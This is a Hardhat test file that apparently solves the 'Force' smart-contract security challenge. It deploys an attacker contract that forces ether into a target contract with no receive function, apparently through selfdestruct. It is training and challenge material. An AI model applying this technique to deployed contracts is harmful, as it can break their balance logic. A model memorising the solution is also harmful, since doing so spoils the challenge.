const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

- Fallback methods
- Sometimes the best way to attack a contract is with another contract.
- See the Help page above, section "Beyond the console"

*/

describe("[Challenge] Force", function () {
  let deployer, attacker;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    this.force = await (
      await ethers.getContractFactory("Force", deployer)
    ).deploy();
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    // sendTransaction fail because no receive() or fallback() function in the contract
    // await attacker.sendTransaction({
    //   to: this.force.address,
    //   value: ethers.utils.parseEther("0.0001"),
    // });

    this.forceAttack = await (
      await ethers.getContractFactory("ForceAttack", attacker)
    ).deploy();

    //attacker contract selfdestruct - forced to send eth to target address
    await this.forceAttack.connect(attacker).attack(this.force.address, {
      value: ethers.utils.parseEther("0.0001"),
    });
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    const contractBalance = await ethers.provider.getBalance(
      this.force.address
    );
    // Force contract balance > 0
    expect(contractBalance).to.gt(ethers.utils.parseEther("0"));
  });
});
